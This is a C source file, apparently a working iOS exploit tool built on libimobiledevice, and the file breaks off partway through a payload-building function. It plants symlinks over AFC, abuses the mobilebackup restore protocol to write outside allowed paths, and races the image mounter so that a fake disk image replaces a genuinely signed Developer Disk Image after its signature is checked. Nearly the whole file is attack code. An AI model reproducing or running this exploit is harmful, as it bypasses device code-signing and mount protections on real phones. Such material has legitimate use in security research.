#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <dirent.h>
#include <libgen.h>
#include <ctype.h>
#include <time.h>
#include <stdbool.h>
#include <pthread.h>
#include <sys/stat.h>

#include <plist/plist.h>
#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/notification_proxy.h>
#include <libimobiledevice/mobilebackup.h>
#include <libimobiledevice/mobilebackup2.h>
#include <libimobiledevice/afc.h>
#include <libimobiledevice/service.h>
#include <libimobiledevice/property_list_service.h>
#include <libimobiledevice/device_link_service.h>
#include <libimobiledevice/syslog_relay.h>
#include <libimobiledevice/mobile_image_mounter.h>

#include <openssl/sha.h>

#include "utils.h"


typedef struct _file_payload_info
{
    const char *stage_1_root_dir;
    const char *stage_1_dir;
} file_payload_info_t;


static const char *path_1 = "Media/PhotoData/c";
static const char *path_2 = "Media/PhotoData/c/mobile_image_mounter";

static const char *local_fake_dmg_path_1 = "./payloads/proteas-step-1.dmg";
static const char *local_fake_dmg_path_2 = "./payloads/proteas-step-2.dmg";

static unsigned int local_real_dmg_file_size = 0;

static const char *local_real_dmg_path = "./payloads/ddi-real.dmg";
static const char *local_real_sig_path = "./payloads/ddi-real.signature";

static const char *ddi_dir_prefix = "/PublicStaging/cache/mmap/";
static const char *ddi_temp_dir_path = NULL;
static const char *ddi_remote_fake_image_path = NULL;

static const char *image_name_fake = "/private/var/mobile/Media/PublicStaging/staging.dimage";

idevice_t get_device();
bool prepare_dir(idevice_t device);
bool remove_temp_dir(idevice_t device);
bool trigger_backup(idevice_t device);
mobilebackup_error_t mobilebackup_client_new2(idevice_t device, 
                                              lockdownd_service_descriptor_t service, 
                                              mobilebackup_client_t * client);
void debug_plist(plist_t plist);
plist_t create_plist_with_path(char const *path);

// remember to free
char* get_udid(idevice_t device);

plist_t create_embedded_payload(const char *udid);
plist_t create_payload(idevice_t device);
plist_t create_send_file_payload(const char *path_from, plist_t path_to_info);

mobilebackup_error_t mobilebackup_error(device_link_service_error_t err);
void print_hash(const unsigned char *hash, int len);
void compute_datahash(const char *path, const char *destpath, uint8_t greylist, const char *domain, const char *appid, const char *version, unsigned char *hash_out);
void sha1_of_data(const char *input, uint32_t size, unsigned char *hash_out);

// remember to free
char* sha1_string_of_data(const char *input, uint32_t size);

int compare_hash(const unsigned char *hash1, const unsigned char *hash2, int hash_len);
void config_user_and_group_id(plist_t root_node, plist_t file_info, unsigned int uid, unsigned int gid);
void compute_payload_hash(const char *domain, const char *destpath, uint8_t greylist, const char *version, unsigned char *hash_out);

// remember to free
char* sha1_transform_data_to_string(unsigned char *sha1_data);

// remember to free
char* data_to_hex_string(unsigned char *data, int length);

// caller to free
void load_file_to_buffer(const char *file_path, char **buffer, unsigned int *length);

bool is_restore_success(plist_t received_dict);

bool ddi_trigger_race1(idevice_t device);
bool ddi_trigger_race2(idevice_t device);
bool ddi_trigger_race_condition(idevice_t device, const char *local_fake_image_path);
bool ddi_create_dir_and_upload_fake_image(afc_client_t afc_client, const char *local_fake_image_path);
bool ddi_check_developer_mounted(idevice_t device);
bool ddi_upload_real_image(mobile_image_mounter_client_t mounter_client);
bool ddi_race_to_replace_image(afc_client_t afc_client);
bool ddi_do_race(afc_client_t afc_client, mobile_image_mounter_client_t mounter_client, const char *local_fake_image_path);
bool ddi_check_mount_result(plist_t result_node);

unsigned long long get_file_size(const char *file_path);

// remember to free
char* ddi_get_dir_path_from_sig();
// remember to free
char* ddi_get_fake_image_path_from_sig();

// free pointer returned
char* ddi_get_real_image_path(afc_client_t afc_client);

ssize_t mobile_image_mounter_upload_cb(void* buffer, size_t length, void *user_data);
mobile_image_mounter_error_t mobile_image_mounter_mount_image2(mobile_image_mounter_client_t client, const char *image_path, const char *signature, uint16_t signature_size, const char *image_type/*, plist_t *result*/);
mobile_image_mounter_error_t mobile_image_mounter_error(property_list_service_error_t err);


int main(int argc, char* argv[])
{
    // Init
    ddi_temp_dir_path = ddi_get_dir_path_from_sig();
    ddi_remote_fake_image_path = ddi_get_fake_image_path_from_sig();
    local_real_dmg_file_size = (unsigned int)get_file_size(local_real_dmg_path);

    // set debug level
    idevice_set_debug_level(1);

    idevice_t target_device = get_device();
    if (target_device == NULL) {
        printf("[-] main: get device\n");
        return -1;
    } else {
        printf("[+] success to get device\n");
    }

    if (!prepare_dir(target_device)) {
        printf("[-] main: prepare dir\n");
        idevice_free(target_device);
        return -1;
    } else {
        printf("[+] success to prepare dir\n");
    }

    if (!trigger_backup(target_device)) {
        printf("[-] main: trigger backup\n");
        idevice_free(target_device);
        return -1;
    } else {
        printf("[+] success to link dir --->'PublicStaging/cache/mmap'\n");
    }

    if (!ddi_trigger_race1(target_device)) {
        printf("[-] main: fail to do race 1\n");
        idevice_free(target_device);
        return -1;
    }

    if (!ddi_trigger_race2(target_device)) {
        printf("[-] main: fail to do race 2\n");
        idevice_free(target_device);
        return -1;
    }

    //remove_temp_dir(target_device);

    idevice_free(target_device); // freee device

    return 0;
}

idevice_t get_device()
{
    char **udids = NULL;
    int count = 0;
    idevice_get_device_list(&udids, &count);
    if (count == 0) {
        printf("[-] get_device: no device\n");
        return NULL;
    }

    for (int idx = 0; idx < count; ++idx) {
        printf("[+] get_device: found device: %s\n", udids[idx]);
    }

    idevice_error_t dev_error = 0;
    idevice_t target_device = 0;
    dev_error = idevice_new(&target_device, udids[0]);
    idevice_device_list_free(udids);

    if (dev_error != IDEVICE_E_SUCCESS) {
        printf("[-] get_device: create device: %d\n", dev_error);
        return NULL;
    }

    return target_device;
}

bool prepare_dir(idevice_t device)
{
    if (device == NULL) {
        printf("[-] prepare_dir: invalid param\n");
        return false;
    }

    afc_error_t afc_error = 0;
    afc_client_t afc_client = NULL;

    // create afc client
    afc_error = afc_client_start_service(device, &afc_client, NULL);
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] prepare_dir: start afc: %d\n", afc_error);
        return false;
    }

    afc_error = afc_remove_path_and_contents(afc_client, "PublicStaging/cache");
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] prepare_dir: fail to remove PublicStaging/cache\n");
    }

    afc_error = afc_make_directory(afc_client, "PublicStaging/cache/mmap");
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] prepare_dir: fail to create PublicStaging/cache\n");
        afc_client_free(afc_client);
        return false;
    }

    afc_error = afc_remove_path_and_contents(afc_client, "__proteas_ex__");
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] prepare_dir: fail to remove __proteas_ex__\n");
    }

    afc_error = afc_remove_path_and_contents(afc_client, "__proteas_mx__");
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] prepare_dir: fail to remove __proteas_mx__\n");
    }

    //-- 1
    afc_error = afc_make_directory(afc_client, "__proteas_ex__/a/b/c");
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] prepare_dir: fail to create __proteas_ex__/a/b/c\n");
        afc_client_free(afc_client);
        return false;
    }

    afc_error = afc_make_directory(afc_client, "__proteas_ex__/var/mobile/Media/PublicStaging/cache");
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] prepare_dir: fail to create __proteas_ex__/var/mobile/Media/PublicStaging/cache\n");
        afc_client_free(afc_client);
        return false;
    }

    uint64_t file_handle = 0;
    afc_error = afc_file_open(afc_client, "__proteas_ex__/var/mobile/Media/PublicStaging/cache/mmap", AFC_FOPEN_WR, &file_handle);
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] prepare_dir: fail to create mmap\n");
        afc_client_free(afc_client);
        return false;
    }
    afc_file_close(afc_client, file_handle);

    afc_error = afc_make_link(afc_client, AFC_SYMLINK, "../../../var/mobile/Media/PublicStaging/cache/mmap", "__proteas_ex__/a/b/c/c");
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] prepare_dir: fail to link mmap\n");
        afc_client_free(afc_client);
        return false;
    }

    //-- 2
    afc_error = afc_make_directory(afc_client, "__proteas_mx__/a/b/c/d/e/f/g");
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] prepare_dir: fail to create __proteas_mx__/a/b/c/d/e/f/g\n");
        afc_client_free(afc_client);
        return false;
    }

    afc_error = afc_make_directory(afc_client, "__proteas_mx__/private/var");
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] prepare_dir: fail to create __proteas_mx__/private/var\n");
        afc_client_free(afc_client);
        return false;
    }

    afc_error = afc_file_open(afc_client, "__proteas_mx__/private/var/run", AFC_FOPEN_WR, &file_handle);
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] prepare_dir: fail to create run\n");
        afc_client_free(afc_client);
        return false;
    }
    afc_file_close(afc_client, file_handle);

    afc_error = afc_make_link(afc_client, AFC_SYMLINK, "../../../../../../../private/var/run", "__proteas_mx__/a/b/c/d/e/f/g/c");
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] prepare_dir: fail to link run\n");
        afc_client_free(afc_client);
        return false;
    }

    // free afc client
    afc_client_free(afc_client);

    return true;
}

bool trigger_backup(idevice_t device)
{
    if (device == NULL) {
        printf("[-] trigger_backup: invalid param\n");
        return false;
    }

    mobilebackup_error_t err = MOBILEBACKUP_E_UNKNOWN_ERROR;
    mobilebackup_client_t backup_client = NULL;
    service_client_factory_start_service(device, "com.apple.mobilebackup", (void**)&backup_client, "", SERVICE_CONSTRUCTOR(mobilebackup_client_new2), &err);
    if (err != 0) {
        printf("[-] trigger_backup: start backup service\n");
        return false;
    }

    //--Begin: trigger restore
    plist_t backup_payload = create_payload(device);
    mobilebackup_send(backup_client, backup_payload);
    plist_free(backup_payload);

    plist_t received_array = NULL;
    mobilebackup_receive(backup_client, &received_array);
    //debug_plist(received_array);
    plist_free(received_array);
    //-- End

    //--Begin: send restore file 1
    plist_t file_info_1 = create_plist_with_path(path_1);
    plist_t send_file_payload_1 = create_send_file_payload("/var/mobile/Media/__proteas_mx__/a/b/c/d/e/f/g/c", file_info_1);
    plist_free(file_info_1);

    mobilebackup_send(backup_client, send_file_payload_1);
    plist_free(send_file_payload_1);

    received_array = NULL;
    mobilebackup_receive(backup_client, &received_array);
    if (!is_restore_success(received_array)) {
        printf("[-] trigger_backup: fail to restore file 1\n");
        plist_free(received_array);
        return false;
    } else {
        plist_free(received_array);
        printf("[+] trigger_backup: success to restore file 1\n");
    }
    //--End

    //--Begin: send restore file 2
    plist_t file_info_2 = create_plist_with_path(path_2);
    plist_t send_file_payload_2 = create_send_file_payload("/var/mobile/Media/__proteas_ex__/a/b/c/c", file_info_2);
    plist_free(file_info_2);

    mobilebackup_send(backup_client, send_file_payload_2);
    plist_free(send_file_payload_2);

    received_array = NULL;
    mobilebackup_receive(backup_client, &received_array);
    if (!is_restore_success(received_array)) {
        printf("[-] trigger_backup: fail to restore file 2\n");
        plist_free(received_array);
        return false;
    } else {
        plist_free(received_array);
        printf("[+] trigger_backup: success to restore file 2\n");
    }
    //--End

    mobilebackup_client_free(backup_client);

    return true;
}

bool ddi_trigger_race1(idevice_t device)
{
    bool mount_result = false;
    for (int idx = 0; idx < 2; ++idx) {
        mount_result = ddi_trigger_race_condition(device, local_fake_dmg_path_1);
        // if (mount_result) {
        //     printf("\n\n[+] ---> ddi_trigger_race1: success to do race 1 <---\n\n");
        //     break;
        // } else {
        //     printf("================================================\n\n\n\n");
        //     sleep(1);
        //     continue;
        // }
    }

    mount_result = true;
    printf("\n\n[+] ---> ddi_trigger_race1: success to do race 1 <---\n\n");

    return mount_result;
}

bool ddi_trigger_race2(idevice_t device)
{
    bool mount_result = false;
    for (int idx = 0; idx < 100; ++idx) {
        mount_result = ddi_trigger_race_condition(device, local_fake_dmg_path_2);
        if (mount_result) {
            printf("\n\n[+] ---> ddi_trigger_race2: success to do race 2 <---\n\n");
            break;
        } else {
            printf("================================================\n\n\n\n");
            sleep(1);
            continue;
        }
    }

    return mount_result;
}

bool ddi_trigger_race_condition(idevice_t device, const char *local_fake_image_path)
{
    if ((device == NULL) || (local_fake_image_path == NULL)) {
        printf("[-] ddi_trigger_race_condition: invalid param\n");
        return false;
    }

    //-- Start Image Mounter Sercie
    mobile_image_mounter_error_t mounter_error = MOBILE_IMAGE_MOUNTER_E_SUCCESS;
    mobile_image_mounter_client_t mounter_client = NULL;
    mounter_error = mobile_image_mounter_start_service(device, &mounter_client, "");
    if (mounter_error != MOBILE_IMAGE_MOUNTER_E_SUCCESS) {
        printf("[-] ddi_trigger_race_condition: fail to start mount service\n");
        return false;
    }

    //-- Start AFC Service
    afc_error_t afc_error = 0;
    afc_client_t afc_client = NULL;
    afc_error = afc_client_start_service(device, &afc_client, NULL);
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] ddi_trigger_race_condition: start afc: %d\n", afc_error);
        mobile_image_mounter_hangup(mounter_client);
        mobile_image_mounter_free(mounter_client);
        return false;
    }

    bool is_payload_1 = (strcmp(local_fake_image_path, local_fake_dmg_path_1) == 0);

    if (is_payload_1) {
        if (ddi_check_developer_mounted(device)) {
            printf("[-] ddi_trigger_race_condition: DeveloperDiskImage has already been mounted\n");
            mobile_image_mounter_hangup(mounter_client);
            mobile_image_mounter_free(mounter_client);
            afc_client_free(afc_client);
            return true;
        } else {
            printf("[+] ddi_trigger_race_condition: DeveloperDiskImage has not been mounted\n");
        }
    }

    // Do Race
    bool result = false;
    if (ddi_do_race(afc_client, mounter_client, local_fake_image_path)) {
        printf("[+] ddi_trigger_race_condition: success to do race\n");
        result = true;
    } else {
        printf("[-] ddi_trigger_race_condition: fail to do race\n");
        result =  false;
    }

    if (is_payload_1) {
        // checking mount result
        if (ddi_check_developer_mounted(device)) {
            printf("[+] ddi_trigger_race_condition: success to do ddi race\n");
            result = true;
        } else {
            printf("[-] ddi_trigger_race_condition: fail to do ddi race\n");
            result = false;
        }
    }

    mobile_image_mounter_hangup(mounter_client);
    mobile_image_mounter_free(mounter_client);
    afc_client_free(afc_client);
    //-- End

    return result;
}

bool ddi_do_race(afc_client_t afc_client, mobile_image_mounter_client_t mounter_client, const char *local_fake_image_path)
{
    if ((afc_client == NULL) || (mounter_client == NULL) || (local_fake_image_path == NULL)) {
        printf("[-] ddi_do_race: invalid param\n");
        return false;
    }

    mobile_image_mounter_error_t mounter_error = 0;
    //afc_error_t afc_error = 0;

    // load signature
    char *sig_data = NULL;
    unsigned int sig_length = 0;
    load_file_to_buffer(local_real_sig_path, &sig_data, &sig_length);

    //-- upload fake image
    if (!ddi_create_dir_and_upload_fake_image(afc_client, local_fake_image_path)) {
        printf("[-] ddi_do_race: fail to create dir and upload fake image\n");
        return false;
    } else {
        printf("[+] ddi_do_race: success to create dir and upload fake image\n");
    }

    //-- upload real image
    if (!ddi_upload_real_image(mounter_client)) {
        printf("[-] ddi_do_race: fail to upload real image\n");
        return false;
    } else {
        printf("[+] ddi_do_race: success to upload real image\n");
    }

    //-- get real image path
    char *real_image_path = ddi_get_real_image_path(afc_client);
    if ((real_image_path == NULL) || (*real_image_path == 0)) {
        printf("[-] ddi_do_race: fail to get real image path\n");
        return false;
    } else {
        //printf("[+] ddi_do_race: %s\n", real_image_path);
    }

    bool result = false;
    mounter_error = mobile_image_mounter_mount_image2(mounter_client, image_name_fake, sig_data, sig_length, "Developer");

    if (mounter_error != MOBILE_IMAGE_MOUNTER_E_SUCCESS) {
        printf("[-] ddi_do_race: fail to do mount action\n");
        result = false;
    } else {
        static const unsigned int scount = 10000;
        usleep(scount);
        while (afc_rename_path(afc_client, ddi_remote_fake_image_path, real_image_path)) {
            printf("[-] ddi_do_race: fail to replace disk image\n");
            usleep(scount);
        }

        usleep(scount);
        plist_t mount_result = NULL;
        mounter_error = mobile_image_mounter_error(property_list_service_receive_plist(mounter_client->parent, &mount_result));
        if (mounter_error != MOBILE_IMAGE_MOUNTER_E_SUCCESS) {
            printf("[-] ddi_do_race: fail to get mount result\n");
            result = false;
        } else {
            // debug_plist(mount_result);

            if (ddi_check_mount_result(mount_result)) {
                printf("[+] success to mount fake image\n");
                result = true;
            } else {
                printf("[-] ddi_do_race: fail to mount fake image\n");
                result = false;
            }
        }

        plist_free(mount_result);
    }

    free(real_image_path);
    free(sig_data); // free signature

    return result;
}

bool ddi_check_mount_result(plist_t result_node)
{
    if (result_node == NULL) {
        printf("[-] ddi_check_mount_result: invalid param\n");
        return false;
    }

    bool result = false;

    plist_t status_node = plist_dict_get_item(result_node, "Status");
    if (status_node == NULL) {
        result = false;
    } else {
        char *status = NULL;
        plist_get_string_val(status_node, &status);
        if (status && (strcmp(status, "Complete") == 0)) {
            result = true;
        } else {
            result = false;
        }
        free(status);
    }

    return result;
}

bool ddi_upload_real_image(mobile_image_mounter_client_t mounter_client)
{
    if (mounter_client == NULL) {
        printf("[-] ddi_upload_real_image: invalid param\n");
        return false;
    }

    mobile_image_mounter_error_t mounter_error = MOBILE_IMAGE_MOUNTER_E_SUCCESS;

    char *sig_data = NULL;
    unsigned int sig_length = 0;
    load_file_to_buffer(local_real_sig_path, &sig_data, &sig_length);

    char *image_buf = NULL;
    unsigned int image_length = 0;
    load_file_to_buffer(local_real_dmg_path, &image_buf, &image_length);

    char *buf_indicator = image_buf;
    mounter_error = mobile_image_mounter_upload_image(mounter_client, "Developer", local_real_dmg_file_size, sig_data, sig_length, &mobile_image_mounter_upload_cb, (void *)&buf_indicator);
    free(sig_data);
    free(image_buf);

    if (mounter_error != MOBILE_IMAGE_MOUNTER_E_SUCCESS) {
        printf("[-] ddi_upload_real_image: fail to upload image\n");
        return false;
    } else {
        printf("[+] ddi_upload_real_image: success to upload image\n");
    }

    return true;
}

ssize_t mobile_image_mounter_upload_cb(void* buffer, size_t length, void *user_data)
{
    char **buf_indicator_ptr = (char **)user_data;
    memcpy(buffer, *buf_indicator_ptr, length);
    *buf_indicator_ptr += length;

    return length;
}

// free pointer returned
char* ddi_get_real_image_path(afc_client_t afc_client)
{
    afc_error_t afc_error = 0;

    char **dir_info = NULL;
    afc_error = afc_read_directory(afc_client, ddi_temp_dir_path, &dir_info);
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] ddi_race_to_replace_image: fail to read dir info\n");
        return NULL;
    }

    static const unsigned int buf_len = 16;
    char target_file_name[buf_len] = {0};
    memset(target_file_name, 0, buf_len);

    for (int idx = 0; dir_info[idx]; ++idx) {
        char *file_name = dir_info[idx];
        if (strstr(file_name, ".dmg") != NULL) {
            strcpy(target_file_name, file_name);
            break;
        }
    }
    afc_dictionary_free(dir_info);

    if (target_file_name[0] == 0) {
        printf("[-] ddi_race_to_replace_image: fail to find target image\n");
        return NULL;
    }

    unsigned int dir_path_length = (unsigned int)strlen(ddi_temp_dir_path);
    unsigned int real_image_length = dir_path_length + (unsigned int)strlen(target_file_name) + 2;
    char *real_image_path = (char *)malloc(real_image_length);
    memset(real_image_path, 0, real_image_length);
    strcpy(real_image_path, ddi_temp_dir_path);
    strcpy(real_image_path + dir_path_length, "/");
    strcpy(real_image_path + dir_path_length + 1, target_file_name);

    return real_image_path;
}

bool ddi_create_dir_and_upload_fake_image(afc_client_t afc_client, const char *local_fake_image_path)
{
    if ((afc_client == NULL) || (local_fake_image_path == NULL)) {
        printf("[-] ddi_create_dir_and_upload_fake_image: invalid param\n");
        return false;
    }

    afc_error_t afc_error = 0;

    afc_remove_path(afc_client, ddi_temp_dir_path);
    afc_error = afc_make_directory(afc_client, ddi_temp_dir_path);
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] ddi_create_dir_and_upload_fake_image: fail to create dir for ddi\n");
        // return false;
    }

    afc_remove_path(afc_client, ddi_remote_fake_image_path);
    uint64_t file_handle = 0;
    afc_error = afc_file_open(afc_client, ddi_remote_fake_image_path, AFC_FOPEN_WRONLY, &file_handle);
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] ddi_create_dir_and_upload_fake_image: fail to create Proteas.dimage\n");
        return false;
    }

    char *image_data = NULL;
    uint32_t image_size = 0;
    load_file_to_buffer(local_fake_image_path, &image_data, &image_size);
    
    uint32_t bytes_written = 0;
    afc_error = afc_file_write(afc_client, file_handle, image_data, image_size, &bytes_written);
    free(image_data);
    if ((afc_error != AFC_E_SUCCESS) || (bytes_written != image_size)) {
        printf("[-] ddi_create_dir_and_upload_fake_image: fail to create Proteas.dimage\n");
        afc_file_close(afc_client, file_handle);
        return false;
    }

    afc_file_close(afc_client, file_handle);

    return true;
}

bool ddi_check_developer_mounted(idevice_t device)
{
    if (device == NULL) {
        printf("[-] ddi_check_developer_mounted: invalid param\n");
        return false;
    }

    mobile_image_mounter_error_t mounter_error = MOBILE_IMAGE_MOUNTER_E_SUCCESS;
    mobile_image_mounter_client_t mounter_client = NULL;
    mounter_error = mobile_image_mounter_start_service(device, &mounter_client, "");
    if (mounter_error != MOBILE_IMAGE_MOUNTER_E_SUCCESS) {
        printf("[-] ddi_trigger_race_condition: fail to start mount service\n");
        return false;
    }

    plist_t lookup_result = NULL;
    mounter_error = mobile_image_mounter_lookup_image(mounter_client, "Developer", &lookup_result);
    if (mounter_error != MOBILE_IMAGE_MOUNTER_E_SUCCESS) {
        printf("[-] ddi_check_developer_mounted: fail to do lookup\n");
        mobile_image_mounter_hangup(mounter_client);
        mobile_image_mounter_free(mounter_client);
        return false;
    }

    plist_t result_node = plist_dict_get_item(lookup_result, "ImagePresent");
    if (result_node == NULL) {
        printf("[-] ddi_check_developer_mounted: fail read dict\n");
        plist_free(lookup_result);
        mobile_image_mounter_hangup(mounter_client);
        mobile_image_mounter_free(mounter_client);
        return false;
    }

    uint8_t is_mounted = 0;
    plist_get_bool_val(result_node, &is_mounted);

    plist_free(lookup_result);
    mobile_image_mounter_hangup(mounter_client);
    mobile_image_mounter_free(mounter_client);

    return is_mounted;
}

bool ddi_race_to_replace_image(afc_client_t afc_client)
{
    if (afc_client == NULL) {
        printf("[-] ddi_race_to_replace_image: invalid param\n");
        return false;
    }

    afc_error_t afc_error = 0;

    char **dir_info = NULL;
    afc_error = afc_read_directory(afc_client, ddi_temp_dir_path, &dir_info);
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] ddi_race_to_replace_image: fail to read dir info\n");
        return false;
    }

    static const unsigned int buf_len = 16;
    char target_file_name[buf_len] = {0};
    memset(target_file_name, 0, buf_len);

    for (int idx = 0; dir_info[idx]; ++idx) {
        char *file_name = dir_info[idx];
        if (strstr(file_name, ".dmg") != NULL) {
            strcpy(target_file_name, file_name);
            break;
        }
    }
    afc_dictionary_free(dir_info);

    if (target_file_name[0] == 0) {
        printf("[-] ddi_race_to_replace_image: fail to find target image\n");
        return false;
    }

    unsigned int dir_path_length = (unsigned int)strlen(ddi_temp_dir_path);
    unsigned int real_image_length = dir_path_length + (unsigned int)strlen(target_file_name) + 2;
    char *real_image_path = (char *)malloc(real_image_length);
    memset(real_image_path, 0, real_image_length);
    strcpy(real_image_path, ddi_temp_dir_path);
    strcpy(real_image_path + dir_path_length, "/");
    strcpy(real_image_path + dir_path_length + 1, target_file_name);

    afc_error = afc_rename_path(afc_client, ddi_remote_fake_image_path, real_image_path);
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] ddi_race_to_replace_image: fail to rename real image file\n");
        free(real_image_path);
        return false;
    } else {
        printf("[+] ddi_race_to_replace_image: success to rename real image file\n");
    }

    free(real_image_path);

    return true;
}

// remember to free
char* ddi_get_dir_path_from_sig()
{
    char *sig_data = NULL;
    unsigned int sig_length = 0;

    // load signature
    load_file_to_buffer(local_real_sig_path, &sig_data, &sig_length);

    char *part_1 = data_to_hex_string((unsigned char *)sig_data, 64);

    char *part_2 = data_to_hex_string((unsigned char *)sig_data + 64, 64);

    unsigned int length = (unsigned int)strlen(ddi_dir_prefix) + 64*2 + 1 + 64*2 + 1;
    char *result = (char *)malloc(length);
    memset(result, 0, length);
    snprintf(result, length, "%s%s/%s", ddi_dir_prefix, part_1, part_2);
    // printf("[+] ddi_get_dir_path_from_sig: %s\n", result);

    free(sig_data);
    free(part_1);
    free(part_2);

    return result;
}

// remember to free
char* ddi_get_fake_image_path_from_sig()
{
    char *dir_path = ddi_get_dir_path_from_sig();
    const char *file_name = "Proteas.dimage";

    unsigned int length = (unsigned int)strlen(dir_path) + (unsigned int)strlen(file_name) + 1;
    char *result = (char *)malloc(length);
    memset(result, 0, length);
    snprintf(result, length, "%s/%s", dir_path, file_name);
    // printf("[+] ddi_get_fake_image_path_from_sig: %s\n", result);

    free(dir_path);

    return result;
}

bool remove_temp_dir(idevice_t device)
{
    if (device == NULL) {
        printf("[-] prepare_dir: invalid param\n");
        return false;
    }

    afc_error_t afc_error = 0;
    afc_client_t afc_client = NULL;

    // create afc client
    afc_error = afc_client_start_service(device, &afc_client, NULL);
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] prepare_dir: start afc: %d\n", afc_error);
        return false;
    }

    // afc_error = afc_remove_path_and_contents(afc_client, "PublicStaging/cache");
    // if (afc_error != AFC_E_SUCCESS) {
    //     printf("[-] prepare_dir: fail to remove PublicStaging/cache\n");
    // }

    afc_error = afc_remove_path_and_contents(afc_client, "__proteas_ex__");
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] prepare_dir: fail to remove __proteas_ex__\n");
    }

    afc_error = afc_remove_path_and_contents(afc_client, "__proteas_mx__");
    if (afc_error != AFC_E_SUCCESS) {
        printf("[-] prepare_dir: fail to remove __proteas_mx__\n");
    }

    // free afc client
    afc_client_free(afc_client);

    return true;
}

bool is_restore_success(plist_t received_array)
{
    if (!received_array) {
        printf("[-] is_restore_success: param invalid\n");
        return false;
    }

    uint32_t count = plist_array_get_size(received_array);
    if (count < 2) {
        printf("[-] is_restore_success: item count invalid\n");
        return false;
    }

    plist_t result_dict = plist_array_get_item(received_array, 1);
    if (!result_dict) {
        printf("[-] is_restore_success: dict is NULL\n");
        return false;
    }

    // BackupMessageTypeKey, BackupMessageRestoreReadError
    plist_t msg_type = plist_dict_get_item(result_dict, "BackupMessageTypeKey");
    if (!msg_type) {
        return false;
    }

    char *buf = NULL;
    plist_get_string_val(msg_type, &buf);
    if (!buf) {
        printf("[-] is_restore_success: fail to get value\n");
        return false;
    }

    if (strcmp(buf, "BackupMessageRestoreFileReceived") != 0) {
        return false;
    } else {
        return true;
    }
}

plist_t create_send_file_payload(const char *path_from, plist_t path_to_info)
{
    if (!path_from || !path_to_info) {
        printf("[-] create_send_file_payload: param invalid\n");
        return NULL;
    }

    plist_t dict_file_attribute = plist_new_dict();;
    plist_dict_set_item(dict_file_attribute, "DeviceIdentifier", plist_new_uint(2LL));
    plist_dict_set_item(dict_file_attribute, "DeviceType", plist_new_uint(2LL));
    plist_dict_set_item(dict_file_attribute, "FileMode", plist_new_uint(-32330LL));
    plist_dict_set_item(dict_file_attribute, "FileSize", plist_new_uint(0LL));
    plist_dict_set_item(dict_file_attribute, "FileSystemFileNumber", plist_new_uint(-2118778880LL));
    plist_dict_set_item(dict_file_attribute, "Filename", plist_new_string("Filename"));
    plist_dict_set_item(dict_file_attribute, "GroupOwnerAccountID", plist_new_uint(0LL));
    plist_dict_set_item(dict_file_attribute, "LinkCount", plist_new_uint(1LL));
    plist_dict_set_item(dict_file_attribute, "OwnerAccountID", plist_new_uint(0LL));

    plist_t array_item_dict = plist_new_dict();
    plist_dict_set_item(array_item_dict, "AuthVersion", plist_new_string("1.0"));
    plist_dict_set_item(array_item_dict, "DLFileAttributesKey", dict_file_attribute);
    plist_dict_set_item(array_item_dict, "DLFileDest", plist_new_string(path_from));
    plist_dict_set_item(array_item_dict, "DLFileIsEncrypted", plist_new_uint(0LL));
    plist_dict_set_item(array_item_dict, "DLFileOffsetKey", plist_new_uint(0LL));
    plist_dict_set_item(array_item_dict, "DLFileSource", plist_new_string("Filename"));
    plist_dict_set_item(array_item_dict, "DLFileStatusKey", plist_new_uint(2LL));
    plist_dict_set_item(array_item_dict, "IsEncrypted", plist_new_bool(0LL));
    
    char *buf = NULL;
    unsigned int length = 0;
    plist_to_bin(path_to_info, &buf, &length);
    plist_dict_set_item(array_item_dict, "Metadata", plist_new_data(buf, length));
    free(buf);

    plist_dict_set_item(array_item_dict, "StorageVersion", plist_new_string("1.0"));
    plist_dict_set_item(array_item_dict, "Version", plist_new_string("3.0"));

    plist_t result_array = plist_new_array();
    plist_array_append_item(result_array, plist_new_string("DLSendFile"));
    plist_array_append_item(result_array, plist_new_data(buf, 0));
    plist_array_append_item(result_array, array_item_dict);

    return result_array;
}

plist_t create_payload(idevice_t device)
{
    if (device == NULL) {
        printf("[-] create_payload: param invalid\n");
        return NULL;
    }

    plist_t manifest = plist_new_dict();

    char *udid = get_udid(device);
    plist_t embeded_payload = create_embedded_payload(udid);
    free(udid); udid = NULL;

    char *buf_embeded = NULL;
    uint32_t buf_embeded_length = 0;
    plist_to_bin(embeded_payload, &buf_embeded, &buf_embeded_length);

    unsigned char embeded_plist_sha1[SHA_DIGEST_LENGTH] = {0};
    sha1_of_data(buf_embeded, buf_embeded_length, embeded_plist_sha1);

    plist_dict_set_item(manifest, "AuthSignature", plist_new_data((const char *)embeded_plist_sha1, 20));
    plist_dict_set_item(manifest, "AuthVersion", plist_new_string("2.0"));
    plist_dict_set_item(manifest, "Data", plist_new_data(buf_embeded, buf_embeded_length));
    plist_dict_set_item(manifest, "IsEncrypted", plist_new_uint(0));

    free(buf_embeded);

    plist_t payload_dict = plist_new_dict();
    plist_dict_set_item(payload_dict, "BackupManifestKey", manifest);
    plist_dict_set_item(payload_dict, "BackupMessageRestoreMigrateKey", plist_new_string("Migrate"));
    plist_dict_set_item(payload_dict, "BackupMessageTypeKey", plist_new_string("kBackupMessageRestoreRequest"));
    plist_dict_set_item(payload_dict, "BackupNotifySpringBoard", plist_new_bool(0));
